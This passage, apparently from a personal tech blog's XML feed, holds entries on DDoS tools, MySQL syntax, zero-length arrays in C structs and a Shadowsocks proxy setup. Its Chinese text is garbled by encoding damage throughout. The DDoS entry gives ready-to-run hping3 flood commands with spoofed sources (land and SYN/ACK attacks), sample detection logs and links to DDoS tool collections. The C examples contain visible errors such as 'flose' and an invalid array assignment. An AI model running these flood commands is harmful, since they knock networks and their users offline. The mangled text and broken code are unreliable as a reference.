<li>éšæ„çš„ç»„åˆå¯ä»¥äº§ç”Ÿæ­£å¸¸é€šä¿¡è¿‡ç¨‹ä¸­æ— æ³•å‡ºç°çš„æ•°æ®åŒ…</li>
</ul>
</li>
<li>è½¯ä»¶ä¸‹æ–¹å¯ä»¥è®¾ç½®æ•°æ®åŒ…çš„å‘é€é€Ÿç‡ï¼Œé»˜è®¤ä¸ºæ— é™é€Ÿå‘é€ï¼Œè¿™ä¼šæš‚ç”¨å¤§é‡å¸¦å®½ï¼Œå¯¼è‡´ç½‘ç»œæ‹¥å¡ï¼›å½“ç„¶å•¦ï¼Œè¿™ä¸ªè½¯ä»¶æœ¬å°±æ˜¯ä¸ºäº†æ”»å‡»ç½‘ç»œï¼Œå¯¼è‡´ç½‘ç»œç˜«ç—ªæ­£æ˜¯å…¶ç›®çš„æ‰€åœ¨</li>
<li>é€‰æ‹©ä¸åŒçš„æ”»å‡»æ–¹å¼ï¼Œä¼šæ˜¾ç¤ºç›¸åº”ä¸åŒçš„é…ç½®é€‰é¡¹</li>
</ul>
<p>ç®€å•è¯´ï¼Œè¿™å¹…å›¾çš„ä½œç”¨æ˜¯äº§ç”Ÿ<code>MAC</code>åœ°å€éšæœºï¼Œ<code>IP</code>ä¸º<code>172.17.14.158</code>ï¼Œç«¯å£ä¸º80çš„ä¼ªé€ æºï¼Œå»æ”»å‡»ç›®çš„<code>MAC</code>éšæœºï¼Œ<code>IP</code>ä¸º<code>172.17.14.10</code>çš„<code>web server</code>ã€‚</p>
<p>ç”±äºç›®çš„<code>MAC</code>éšæœºï¼Œ<strong>å½“MACåœ°å€é¦–å­—èŠ‚ä¸ºå¥‡æ•°æ—¶ï¼Œç”Ÿæˆçš„æ•°æ®åŒ…ä¸ºå¹¿æ’­åŒ…</strong>ï¼Œæ­¤æ—¶å°†äº§ç”Ÿå¹¿æ’­é£æš´ï¼Œå±€åŸŸç½‘å†…çš„æ‰€æœ‰è®¾å¤‡éƒ½å°†æ”¶åˆ°å¤§é‡çš„å¹¿æ’­åŒ…ï¼Œå½“é€Ÿç‡å¾ˆé«˜æ—¶ï¼Œå¾ˆå®¹æ˜“å¯¼è‡´å±€åŸŸç½‘ç˜«ç—ªï¼Œè¿™æ˜¯éœ€è¦æ³¨æ„çš„ã€‚æœ¬äººå½“æ—¶å¹´å°‘è½»ç‹‚ï¼Œæœ‰æ¬¡æµ‹è¯•ï¼Œä½¿ç”¨å…¨é€Ÿç‡çš„å¹¿æ’­å¼<code>SYN/ACK</code>æ”»å‡»ï¼Œç›´æ¥å¯¼è‡´éƒ¨é—¨çš„å±€åŸŸç½‘ç˜«ç—ªæ–­ç½‘ï¼Œå¹¸å¥½æ˜¯æ™šä¸Šï¼Œåæ¥æ‰¾äººé‡ç½®äº†éƒ¨é—¨å†…çš„ç½‘ç»œè®¾å¤‡æ‰æ¢å¤ï¼Œæƒ³æƒ³çœŸæ˜¯ç½ªè¿‡å•Šã€‚</p>
<h3 id="Use-cases"><a href="#Use-cases" class="headerlink" title="Use cases"></a>Use cases</h3><ul>
<li>Land Attack<ul>
<li>src:  %-172.17.14.94@53</li>
<li>des: %-172.17.14.94@80</li>
</ul>
</li>
</ul>
<pre><code class="bash">DoS *** 3118 *** {Land Attack} are suppressed!
[DoS Attack: Land Attack] from source: 172.17.14.94, port 53,
[DoS Attack: Land Attack] from source: 172.17.14.94, port 53,
[DoS Attack: Land Attack] from source: 172.17.14.94, port 53,
</code></pre>
<ul>
<li>SYN/ACK scan (TCP SYN ACK)<ul>
<li>src: %-172.17.14.8@80</li>
<li>des: %-172.17.14.94@80</li>
</ul>
</li>
</ul>
<pre><code class="bash">DoS *** 3896 *** {SYN/ACK Scan} are suppressed!
[DoS Attack: SYN/ACK Scan] from source: 172.17.14.8, port 80,
[DoS Attack: SYN/ACK Scan] from source: 172.17.14.8, port 80,
[DoS Attack: SYN/ACK Scan] from source: 172.17.14.8, port 80,
</code></pre>
<ul>
<li>ping flood (icmp echo)<ul>
<li>src:  %-172.17.14.8</li>
<li>des: %-172.17.14.94</li>
</ul>
</li>
</ul>
<pre><code class="bash">DoS *** 1881 *** {Ping Flood} are suppressed!
[DoS Attack: Ping Flood] from source: 172.17.14.8,
[DoS Attack: Ping Flood] from source: 172.17.14.8,
[DoS Attack: Ping Flood] from source: 172.17.14.8,
</code></pre>
<ul>
<li>ping sweep (icmp echo)<ul>
<li>src:  %-%</li>
<li>des: %-%</li>
</ul>
</li>
</ul>
<pre><code class="bash">DoS *** 1719 *** {Ping Sweep} are suppressed!
[DoS Attack: Ping Sweep] from source: 188.167.1.1,
[DoS Attack: Ping Sweep] from source: 113.172.1.5,
[DoS Attack: Ping Sweep] from source: 175.181.2.6,
</code></pre>
<ul>
<li>RST Scan(TCP RST)<ul>
<li>src: %-172.17.14.8@80</li>
<li>des: %-172.17.14.94@80</li>
</ul>
</li>
</ul>
<pre><code class="bash">DoS *** 4023 *** {RST Scan} are suppressed!
[DoS Attack: RST Scan] from source: 172.17.14.8, port 80,
[DoS Attack: RST Scan] from source: 172.17.14.8, port 80,
[DoS Attack: RST Scan] from source: 172.17.14.8, port 80,
</code></pre>
<ul>
<li>ACK scan (TCP ACK)<ul>
<li>src: %-172.17.14.8@80</li>
<li>des: %-172.17.14.94@80</li>
</ul>
</li>
</ul>
<pre><code class="bash">DoS *** 3989 *** {ACK Scan} are suppressed!
[DoS Attack: ACK Scan] from source: 172.17.14.8, port 80,
[DoS Attack: ACK Scan] from source: 172.17.14.8, port 80,
[DoS Attack: ACK Scan] from source: 172.17.14.8, port 80
</code></pre>
<ul>
<li>FIN scan(TCP FIN)<ul>
<li>src: %-172.17.14.8@80</li>
<li>des: %-172.17.14.94@80</li>
</ul>
</li>
</ul>
<pre><code class="bash">DoS *** 3009 *** {FIN Scan} are suppressed!
[DoS Attack: FIN Scan] from source: 172.17.14.8, port 80,
[DoS Attack: FIN Scan] from source: 172.17.14.8, port 80,
[DoS Attack: FIN Scan] from source: 172.17.14.8, port 80,
</code></pre>
<h2 id="hping3"><a href="#hping3" class="headerlink" title="hping3"></a>hping3</h2><blockquote>
<p>hping3æ˜¯ç”¨äºç”Ÿæˆå’Œè§£æTCPIPåè®®æ•°æ®åŒ…çš„å¼€æºå·¥å…·</p>
</blockquote>
<p><code>hping3</code>åŒæ ·å¯ç”¨äºäº§ç”Ÿ<code>ddos</code>æ”»å‡»åŒ…ï¼Œä½†ä¸<code>hyenae</code>ä¸åŒçš„æ˜¯ï¼Œ<code>hping3</code>æ— æ³•æ‰‹åŠ¨è®¾ç½®<code>MAC</code>åœ°å€ï¼Œè€Œæ˜¯æ ¹æ®<code>IP</code>åœ°å€è‡ªåŠ¨è·å–</p>
<p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå¦‚æœä½¿ç”¨æ¬ç“¦å·¥è´­ä¹°çš„<code>vps</code>å‘å…¬ç½‘IPæ‰§è¡Œ<code>hping3</code>æ”»å‡»çš„è¯ï¼Œæœ€å¥½ä¸è¦å°è¯•ï¼Œå¦‚æœè¦ç”¨ä¹Ÿä¸€å®šè®°å¾—é™é€Ÿï¼Œå¦åˆ™å°±ä¼šè¢«è­¦å‘Šå¹¶å…³åœ,å½“ç„¶ä½ æœ‰3æ¬¡æœºä¼šé‡ç½®</p>
<p><img src="/assets/network/vps-warning.png" alt="vps warning"></p>
<h3 id="examples"><a href="#examples" class="headerlink" title="examples"></a>examples</h3><pre><code class="bash"># land attack
$ sudo hping3 -V -c 10000 -d 120 -S -w 64 --keep -p 80 -s 20000 --flood -a 172.17.14.52 172.17.14.52
# syn/ack attack
$ sudo hping3 -V -c 10000 -d 120 -S -A -w 64 --keep -p 80 -s 80 --flood -a 172.17.14.192 172.17.14.52

# -V verbose
# -c packet count
# -d data size
# -p destPort
# -s srcPort
# -a srcIP
# -S SYN tag
# -A ACK tag
# -w winsize
# -I interface
</code></pre>
<h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><ul>
<li><p>ç½‘ç»œæ”»å‡»å·¥å…·</p>
<ul>
<li>hping3<ul>
<li><a href="http://man.linuxde.net/hping3" target="_blank" rel="noopener">http://man.linuxde.net/hping3</a></li>
<li><a href="http://0daysecurity.com/articles/hping3_examples.html" target="_blank" rel="noopener">http://0daysecurity.com/articles/hping3_examples.html</a></li>
</ul>
</li>
<li>LOIC</li>
<li>hyenae<ul>
<li><a href="https://sourceforge.net/projects/hyenae/" target="_blank" rel="noopener">https://sourceforge.net/projects/hyenae/</a></li>
</ul>
</li>
<li>å…è´¹DDOSæ”»å‡»æµ‹è¯•å·¥å…·å¤§åˆé›† <a href="http://www.freebuf.com/sectool/36545.html" target="_blank" rel="noopener">http://www.freebuf.com/sectool/36545.html</a></li>
</ul>
</li>
<li><p>ddosæ”»å‡»è¯´æ˜</p>
<ul>
<li><a href="https://security.radware.com/ddos-knowledge-center/ddospedia/syn-flood/" target="_blank" rel="noopener">https://security.radware.com/ddos-knowledge-center/ddospedia/syn-flood/</a></li>
<li>ç½‘ç»œæ”»å‡»ï¼šåŠè¿æ¥æ”»å‡»(SYNæ”»å‡»)ã€å…¨è¿æ¥æ”»å‡»ã€RSTæ”»å‡»ã€IPæ¬ºéª—ã€DNSæ¬ºéª—ã€DOS/DDOSæ”»å‡» <a href="http://blog.csdn.net/guowenyan001/article/details/11777361" target="_blank" rel="noopener">http://blog.csdn.net/guowenyan001/article/details/11777361</a></li>
</ul>
</li>
</ul>
]]></content>
      
        <categories>
            
            <category> Network </category>
            
            <category> Security </category>
            
        </categories>
        
        
        <tags>
            
            <tag> ddos </tag>
            
            <tag> hping3 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[mySQLåŸºæœ¬è¯­æ³•]]></title>
      <url>https://www.litreily.top/2018/02/08/mysql-basic/</url>
      <content type="html"><![CDATA[<p>æœ€è¿‘æŠ˜è…¾<code>vps</code>ï¼Œæƒ³è¦æ‰‹åŠ¨æ­å»ºä¸€ä¸ª<code>LNMP</code>ç¯å¢ƒï¼Œé‚£å¿…ç„¶å°‘ä¸äº†è¦è¡¥è¡¥è¯¾ï¼Œç®€å•å­¦ä¹ ä¸€ä¸‹<code>mysql</code>çš„åŸºæœ¬è¯­æ³•ã€‚</p>
<h2 id="install-mySQL"><a href="#install-mySQL" class="headerlink" title="install mySQL"></a>install mySQL</h2><h3 id="install-on-Centos"><a href="#install-on-Centos" class="headerlink" title="install on Centos"></a>install on Centos</h3><pre><code class="bash">$ sudo yum update
$ sudo yum install mysql-server mysql-client
$ sudo yum install mysql-devel # install sdk of mysql
# /usr/include/mysql/mysql.h
</code></pre>
<a id="more"></a>
<h3 id="install-on-Ubuntu"><a href="#install-on-Ubuntu" class="headerlink" title="install on Ubuntu"></a>install on Ubuntu</h3><pre><code class="bash">sudo apt-get update
sudo apt-get install mysql-server mysql-client
sudo apt-get install libmysqlclient15-dev || sudo apt-get install libmysqlclient-dev
</code></pre>
<h2 id="mySQL-cmd"><a href="#mySQL-cmd" class="headerlink" title="mySQL cmd"></a>mySQL cmd</h2><h3 id="login"><a href="#login" class="headerlink" title="login"></a>login</h3><pre><code class="bash">$ mysql -u USERNAME -p
$ mysql -u root -p
mysql&gt; \h
</code></pre>
<h3 id="add-user"><a href="#add-user" class="headerlink" title="add user"></a>add user</h3><pre><code class="bash">mysql&gt; CREATE USER &#39;username&#39;@&#39;host&#39; IDENTIFIED BY &#39;password&#39;;

# e.g.
mysql&gt; CREATE USER &#39;test&#39;@&#39;localhost&#39; IDENTIFIED BY &#39;123456&#39;;
</code></pre>
<h3 id="set-password"><a href="#set-password" class="headerlink" title="set password"></a>set password</h3><pre><code class="bash"># ä¸ºå½“å‰ç”¨æˆ·è®¾ç½®æ–°çš„å¯†ç 
mysql&gt; SET PASSWORD = PASSWORD(&quot;newpassword&quot;);

# ä¸ºå…¶å®ƒç”¨æˆ·é‡è®¾å¯†ç 
mysql&gt; SET PASSWORD FOR &#39;username&#39;@&#39;host&#39; = PASSWORD(&#39;newpassword&#39;);
</code></pre>
<h3 id="delete-user"><a href="#delete-user" class="headerlink" title="delete user"></a>delete user</h3><pre><code class="bash">DROP USER &#39;username&#39;@&#39;host&#39;
</code></pre>
<h3 id="grant-privileges"><a href="#grant-privileges" class="headerlink" title="grant privileges"></a>grant privileges</h3><pre><code class="bash"># ä¸ºç”¨æˆ·æˆæƒ
# privileges: SELECT, INSERT, UPDATE, ALL, ...
mysql&gt; GRANT privileges ON databasename.tablename TO &#39;username&#39;@&#39;host&#39;;
# åˆ·æ–°ç¼“å­˜ï¼Œä½¿æˆæƒç”Ÿæ•ˆ
mysql&gt; FLUSH PRIVILEGES;

# e.g.
mysql&gt; GRANT SELECT, INSERT ON test.user TO &#39;pig&#39;@&#39;%&#39;;
mysql&gt; GRANT ALL ON *.* TO &#39;pig&#39;@&#39;%&#39;;
</code></pre>
<h3 id="databases-and-tables"><a href="#databases-and-tables" class="headerlink" title="databases and tables"></a>databases and tables</h3><ul>
<li>create database or table</li>
</ul>
<pre><code class="bash"># create database: vps
mysql&gt; CREATE DATABASE vps;
Query OK, 1 row affected (0.00 sec)

# show databases
mysql&gt; SHOW DATABASES;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| vps                |
+--------------------+
5 rows in set (0.00 sec)

# use database
mysql&gt; USE vps;

# create table
mysql&gt; CREATE TABLE test_tbl(
    -&gt; test_id INT NOT NULL AUTO_INCREMENT,
    -&gt; test_title VARCHAR(100) NOT NULL,
    -&gt; test_author VARCHAR(40) NOT NULL,
    -&gt; test_date DATE,
    -&gt; PRIMARY KEY ( test_id )
    -&gt; )ENGINE=InnoDB DEFAULT CHARSET=utf8;
Query OK, 0 rows affected (0.06 sec)

# show tables
mysql&gt; SHOW TABLES;
+---------------+
| Tables_in_vps |
+---------------+
| test_tbl      |
+---------------+
1 row in set (0.00 sec)

# describe table
mysql&gt; DESC test_tbl;
+-------------+--------------+------+-----+---------+----------------+
| Field       | Type         | Null | Key | Default | Extra          |
+-------------+--------------+------+-----+---------+----------------+
| test_id     | int(11)      | NO   | PRI | NULL    | auto_increment |
| test_title  | varchar(100) | NO   |     | NULL    |                |
| test_author | varchar(40)  | NO   |     | NULL    |                |
| test_date   | date         | YES  |     | NULL    |                |
+-------------+--------------+------+-----+---------+----------------+
4 rows in set (0.03 sec)

# drop table
mysql&gt; DROP TABLE runoob_tbl;
Query OK, 0 rows affected (0.01 sec)
</code></pre>
<p>in conclusion</p>
<pre><code class="bash">mysql&gt; CREATE DATABESE dataBaseName;
mysql&gt; SHOW DATABASES;
mysql&gt; USE dataBaseName;
mysql&gt; CREATE TABLE tableName(content);
mysql&gt; SHOW TABLES;
mysql&gt; DESC tableName;
mysql&gt; DROP tableName;
</code></pre>
<ul>
<li>handle tables</li>
</ul>
<h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><ul>
<li><a href="http://www.runoob.com/mysql/mysql-tutorial.html" target="_blank" rel="noopener">http://www.runoob.com/mysql/mysql-tutorial.html</a></li>
</ul>
]]></content>
      
        <categories>
            
            <category> Tools </category>
            
        </categories>
        
        
        <tags>
            
            <tag> linux </tag>
            
            <tag> mysql </tag>
            
            <tag> centos </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[ç»“æ„ä½“ä¸­é•¿åº¦ä¸º0çš„å­—ç¬¦æ•°ç»„]]></title>
      <url>https://www.litreily.top/2018/01/02/len0-charArray/</url>
      <content type="html"><![CDATA[<p>åœ¨Cè¯­è¨€çš„ç»“æ„ä½“ä¸­ï¼Œæœ‰ä¸€ç§ç‰¹æ®Šç”¨æ³•ï¼Œåœ¨ç»“æ„ä½“çš„æœ«å°¾æ”¾ç½®ä¸€ä¸ªé•¿åº¦ä¸º0çš„å­—ç¬¦æ•°ç»„ï¼Œç»“æ„ä½“å€’æ•°ç¬¬äºŒä¸ªä½ç½®æ”¾ç½®ä¸€ä¸ªæ•´å‹å˜é‡<code>len</code>ã€‚å…¶å…¸å‹æ ·ä¾‹å¦‚ä¸‹ï¼š</p>
<pre><code class="c">typedef struct dynamic_value {
  int flag;
  int len;
  char val[0];
}s_flv;
</code></pre>
<p>æœ¬æ–‡é’ˆå¯¹å…¶ç‰¹å¾ï¼Œç”¨æ³•åŠé€‚ç”¨åœºåˆäºˆä»¥ç®€å•ä»‹ç»ã€‚</p>
<h2 id="ç‰¹å¾"><a href="#ç‰¹å¾" class="headerlink" title="ç‰¹å¾"></a>ç‰¹å¾</h2><ul>
<li>æœ€åçš„å­—ç¬¦æ•°ç»„<code>val</code>é•¿åº¦ä¸º0ï¼Œä¸å ç”¨é¢å¤–çš„å†…å­˜ç©ºé—´</li>
<li>å€’æ•°ç¬¬äºŒä¸ªå…ƒç´ ä¸ºä¸€æ•´å‹å˜é‡ï¼Œç”¨äºå­˜å‚¨å­—ç¬¦æ•°ç»„çš„çœŸå®é•¿åº¦</li>
<li><code>val</code>å®é™…æŒ‡å‘çš„æ˜¯ç»“æ„ä½“<code>s_flv</code>ä¹‹åçš„å†…å­˜ç©ºé—´</li>
<li>å­—ç¬¦æ•°ç»„çš„å¤§å°å¯ä»¥åœ¨å®šä¹‰ç»“æ„ä½“å˜é‡æ—¶åŠ¨æ€æŒ‡å®š<code>s_flv.len</code></li>
<li>ç»“æ„ä½“å…ƒç´ ä¸ªæ•°ä¸é™ï¼Œæ ·ä¾‹ä¸ºå…¸å‹æ¨¡å¼ï¼Œå…¶ä¸­çš„<code>flag</code>ä½œä¸ºæ ‡ç­¾ç”¨ä»¥æ ‡è¯†ä¸åŒçš„æ•°æ®</li>
</ul>
<h2 id="ç”¨æ³•"><a href="#ç”¨æ³•" class="headerlink" title="ç”¨æ³•"></a>ç”¨æ³•</h2><ul>
<li>æŒ‰<code>s_flv</code>æ ¼å¼å†™å…¥æ•°æ®åˆ°æ–‡ä»¶</li>
</ul>
<pre><code class="c">#include &lt;stdio.h&gt;

static void write_flv(FILE *fp, int flag, char *val)
{
    int len = 0;
    if(val == NULL)
        val = &quot;&quot;;
    else
        len = strlen(val);

    fwrite(&amp;flag, sizeof(flag), 1, fp); // å†™å…¥æ ‡è¯†
    fwrite(&amp;len, sizeof(len), 1, fp);   // å†™å…¥å­—ç¬¦æ•°ç»„é•¿åº¦
    fwrite(val, len, 1, fp);    // å†™å…¥é•¿åº¦ä¸ºlençš„å­—ç¬¦ä¸²
}
</code></pre>
<ul>
<li>è¯»å–æ–‡ä»¶</li>
</ul>
<pre><code class="c">#include &lt;stdio.h&gt;

static int read_flv(char *file, char *val)
{
    char buf[32];   // å‡å®šå­—ç¬¦æ•°ç»„é•¿åº¦å°ç­‰äº32
    char *p = buf;

    FILE *fp = fopen(file, &quot;r&quot;);
    if(!fp)
        return -1;

    if(fread(buf, 2*sizeof(int), 1, fp) &lt;= 0)   // è¯»å–å‰ä¸¤ä¸ªæ•´å‹æ•°æ®ï¼Œè·å–å­—ç¬¦æ•°ç»„é•¿åº¦
        return -1;

    s_flv *flv = (s_flv *)p;        // å®šä¹‰s_flvç»“æ„ä½“ï¼Œå­˜å‚¨æ•°æ®
    fread(val, flv-&gt;len, 1, fp);    // è¯»å–å­—ç¬¦æ•°ç»„
    flose(fp);
    return 0;
}
</code></pre>
<ul>
<li><strong>è¯´æ˜</strong><ul>
<li>æ¯æ‰§è¡Œä¸€æ¬¡<code>fread</code>æˆ–<code>fwrite</code>å‡½æ•°ï¼Œæ–‡ä»¶æŒ‡é’ˆå°±å¾€ååç§»ç›¸åº”çš„è¯»å–é•¿åº¦æˆ–å†™å…¥é•¿åº¦</li>
<li><code>read_flv</code>å®šä¹‰<code>flv</code>æ—¶ï¼Œä»<code>buf</code>ä¸­å¯ä»¥è·å–åˆ°æ•°ç»„é•¿åº¦ï¼Œç„¶åä½¿ç”¨<code>fread</code>è¯»å–ç›¸åº”é•¿åº¦çš„æ•°æ®å³å¯å–å‡ºå­—ç¬¦æ•°ç»„çš„å†…å®¹ã€‚</li>
<li>ä½¿ç”¨ä»¥ä¸Šæ–¹æ³•ç”Ÿæˆçš„æ–‡ä»¶å†…å®¹æ˜¯äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œè®¸å¤šå­—ç¬¦æ˜¯ä¸å¯æ‰“å°å­—ç¬¦ï¼Œæ‰€ä»¥ä½¿ç”¨<code>cat</code>æŒ‡ä»¤æ— æ³•æ­£å¸¸æ˜¾ç¤ºæ–‡ä»¶å†…å®¹</li>
</ul>
</li>
</ul>
<p>ä¸Šé¢æè¿°çš„æ–¹æ³•æ˜¯å°†<code>s_flv</code>ç±»å‹çš„æ•°æ®å­˜å…¥æ–‡ä»¶ï¼Œä½†å¦‚æœä¸æƒ³å­˜å…¥æ–‡ä»¶ï¼Œé‚£ä¹ˆè¯¥å¦‚ä½•ä¸ºå…¶åˆ†é…å†…å­˜å‘¢ï¼Œä¸‹é¢æ¥çœ‹ä¸€ä¸‹ï¼š</p>
<pre><code class="c">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

// å®šä¹‰s_flvæŒ‡é’ˆå˜é‡
int size = 10;
s_flv *flv = (s_flv *)malloc(sizeof(s_flv) + size);
flv-&gt;len = size;
flv-&gt;val = flv + sizeof(s_flv);

// é‡Šæ”¾æŒ‡é’ˆ
free(flv);
</code></pre>
<h2 id="é€‚ç”¨åœºåˆ"><a href="#é€‚ç”¨åœºåˆ" class="headerlink" title="é€‚ç”¨åœºåˆ"></a>é€‚ç”¨åœºåˆ</h2><ul>
<li><code>json</code>æ–‡ä»¶çš„è¯»å†™</li>
<li>ä¸å®šé•¿åº¦å­—ç¬¦ä¸²çš„è¯»å†™</li>
</ul>
<h2 id="æ‰©å±•é˜…è¯»"><a href="#æ‰©å±•é˜…è¯»" class="headerlink" title="æ‰©å±•é˜…è¯»"></a>æ‰©å±•é˜…è¯»</h2><ul>
<li><a href="http://www.cnblogs.com/felove2013/articles/4050226.html" target="_blank" rel="noopener">æµ…æé•¿åº¦ä¸º0çš„æ•°ç»„</a></li>
</ul>
]]></content>
      
        <categories>
            
            <category> Embedded </category>
            
        </categories>
        
        
        <tags>
            
            <tag> C/C++ </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[VPS+SSç¿»è¶ŠGFW]]></title>
      <url>https://www.litreily.top/2017/09/07/ss-config/</url>
      <content type="html"><![CDATA[<h2 id="è´­ä¹°å¹¶é…ç½®VPS"><a href="#è´­ä¹°å¹¶é…ç½®VPS" class="headerlink" title="è´­ä¹°å¹¶é…ç½®VPS"></a>è´­ä¹°å¹¶é…ç½®VPS</h2><p>åœ¨<a href="http://banwagong.cn/" target="_blank" rel="noopener">æ¬ç“¦å·¥</a>é€‰æ‹©ä¸€ä¸ª<code>VPS</code>ï¼Œå¤§æ¦‚æ¯å¹´<code>$19.99</code>ï¼Œä½¿ç”¨é‚€è¯·ç å¯ä¼˜æƒ <code>6%</code>ï¼Œå¯ä»¥ä½¿ç”¨æ”¯ä»˜å®(Alipay)è´­ä¹°ã€‚æˆåŠŸè´­ä¹°<code>VPS</code>åï¼Œè¿›å…¥<code>VPS</code>çš„<a href="https://kiwivm.64clouds.com/main.php" target="_blank" rel="noopener">ç®¡ç†ç•Œé¢</a>ï¼Œç™»å½•è´¦æˆ·åä¾¿å¯ä»¥æŸ¥çœ‹æœåŠ¡å™¨ä¿¡æ¯ï¼Œå¹¶è¿›è¡Œç›¸å…³é…ç½®äº†ã€‚</p>
<h2 id="å®‰è£…SSæœåŠ¡å™¨"><a href="#å®‰è£…SSæœåŠ¡å™¨" class="headerlink" title="å®‰è£…SSæœåŠ¡å™¨"></a>å®‰è£…SSæœåŠ¡å™¨</h2><p>å¦‚æœVPSé€‰ç”¨<code>centos</code>ç³»ç»Ÿï¼Œåˆ™å¯ä»¥ç›´æ¥åœ¨é…ç½®ç•Œé¢å·¦ä¸‹æ–¹é€‰æ‹©<code>Shadowsocks Server</code>ï¼Œä¸€é”®å®‰è£…å°±<code>ok</code>äº†ï¼Œå½“ç„¶å–œæ¬¢æŠ˜è…¾çš„ä¹Ÿå¯ä»¥è‡ªå·±ç”¨<code>yum install</code>ä¸‹è½½å®‰è£…å’Œé…ç½®<code>Shadowsocks</code>ï¼Œæ­¤ä¸èµ˜è¿°ã€‚</p>
<h2 id="å®‰è£…SSå®¢æˆ·ç«¯"><a href="#å®‰è£…SSå®¢æˆ·ç«¯" class="headerlink" title="å®‰è£…SSå®¢æˆ·ç«¯"></a>å®‰è£…SSå®¢æˆ·ç«¯</h2><h3 id="Ubuntu"><a href="#Ubuntu" class="headerlink" title="Ubuntu"></a>Ubuntu</h3><p><code>Ubuntu</code>å¯ä»¥é€‰æ‹©<code>github</code>ä¸­çš„<a href="https://github.com/shadowsocks/shadowsocks" target="_blank" rel="noopener">shadowsocks/shadowsocks</a>ï¼Œæˆ–<a href="https://github.com/shadowsocks/shadowsocks-qt5" target="_blank" rel="noopener">shadowsocks/shadowsocks-qt5</a>.</p>
<h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3><p><code>Windows</code>é€‰æ‹©<a href="https://github.com/shadowsocks/shadowsocks-windows" target="_blank" rel="noopener">shadowsocks/shadowsocks-windows</a>ï¼Œæˆ–<code>shadowsocks/shadowsocks-qt5</code>ä¸­çš„<a href="https://github.com/shadowsocks/shadowsocks-qt5/releases" target="_blank" rel="noopener">ss-qt5-v2.9.0-win64.7z</a>ã€‚æœ¬äººåˆšå¼€å§‹ä½¿ç”¨å‰è€…ï¼Œæ— æ³•ç§‘å­¦ä¸Šç½‘ï¼Œä»<code>log</code>ä¿¡æ¯ä¸­å‘ç°å¯ä»¥å°†æ•°æ®å‘é€è‡³<code>VPS</code>ï¼Œä½†<code>VPS</code>æ— æ³•è§£æå…¶å¤´éƒ¨ä¿¡æ¯ï¼Œæ•…è€Œè¿æ¥å¤±è´¥ï¼Œåæ¥å°è¯•ç½‘ä¸Šå„ç§æ–¹æ³•æ— æœï¼Œæœ€ç»ˆä½¿ç”¨<code>qt5</code>ç‰ˆæœ¬æˆåŠŸã€‚å…·ä½“åŸå› ä¸è¯¦ã€‚</p>
<h3 id="Android"><a href="#Android" class="headerlink" title="Android"></a>Android</h3><p>å®‰å“ç«¯å°±ä¸‹è½½å®‰è£…<a href="https://github.com/shadowsocks/shadowsocks-android/releases" target="_blank" rel="noopener">shadowsocks/shadowsocks-android</a>å†…çš„<code>apk</code>å³å¯ã€‚</p>
<h2 id="é…ç½®SSå®¢æˆ·ç«¯"><a href="#é…ç½®SSå®¢æˆ·ç«¯" class="headerlink" title="é…ç½®SSå®¢æˆ·ç«¯"></a>é…ç½®SSå®¢æˆ·ç«¯</h2><p><code>SS</code>çš„é…ç½®ç›¸å½“ç®€å•ï¼Œå‚è€ƒ<code>VPS</code>ä¸­<code>Shadowsocks</code>é…ç½®ç•Œé¢ç»™çš„ä¿¡æ¯å³å¯ï¼Œå¿…è¦ä¿¡æ¯åŒ…æ‹¬ï¼š</p>
<ul>
<li>æœåŠ¡å™¨åœ°å€ (<code>Host IP</code>)</li>
<li>å¯†ç (<code>password</code>)  </li>
<li>ç«¯å£å·<code>Port(default:443)</code></li>
<li>åŠ å¯†æ–¹å¼<code>encryption(default:aes-256-cfb)</code></li>
</ul>
<h2 id="é…ç½®æµè§ˆå™¨"><a href="#é…ç½®æµè§ˆå™¨" class="headerlink" title="é…ç½®æµè§ˆå™¨"></a>é…ç½®æµè§ˆå™¨</h2><p>æ— è®ºæ˜¯<code>google chrome</code>è¿˜æ˜¯<code>firefox</code>ï¼Œéƒ½æœ‰ç›¸åº”çš„ä»£ç†æ’ä»¶ï¼Œæœ€å¸¸ç”¨çš„æ˜¯<code>SwitchyOmega</code>ã€‚ä¸‹è½½è¯¥æ’ä»¶å¹¶å®‰è£…åï¼Œéœ€è¦æ‰“å¼€æ’ä»¶çš„<strong>é€‰é¡¹</strong>ï¼Œè¿›è¡Œä¸€å®šçš„é…ç½®æ“ä½œï¼š</p>
<ol>
<li>æ–°å»º<strong>æƒ…æ™¯æ¨¡å¼</strong>ï¼ˆ<code>profile</code>ï¼‰ï¼Œå‘½åéšæ„ï¼Œå¦‚ï¼š<strong>SS</strong>;</li>
<li>åœ¨é»˜è®¤(<code>default</code>)é€‰é¡¹ä¸­é€‰æ‹©<code>SOCK5</code>ï¼ŒæœåŠ¡å™¨(<code>Server</code>)è®¾ä¸º<code>127.0.0.1</code>ï¼Œç«¯å£(<code>port</code>)è®¾ä¸º<code>1080</code>;</li>
<li>ç‚¹å‡»å·¦ä¾§çš„åº”ç”¨ä¿®æ”¹(<code>Apply changes</code>);</li>
<li>ç‚¹å‡»<code>auto switch</code>ï¼Œé¡µé¢ä¸Šçš„æ¡ä»¶æ (<code>condition</code>)ä¸ç”¨ç®¡ï¼Œç‚¹å‡»ä¸‹é¢çš„æ·»åŠ è§„åˆ™ï¼Œåœ¨æƒ…æ™¯æ¨¡å¼ï¼ˆ<code>profile</code>ï¼‰ä¸€åˆ—ä¸­é€‰æ‹©ä¹‹å‰åˆ›å»ºçš„<code>SS</code>ï¼Œé»˜è®¤é€‰é¡¹åˆ†ä¸¤ç§æƒ…å†µï¼š<ul>
<li>æ™®é€šç½‘ç»œï¼Œæ²¡æœ‰é¢å¤–ä»£ç†çš„æƒ…å†µï¼Œé»˜è®¤è®¾ä¸ºç›´è¿(<code>direct</code>);</li>
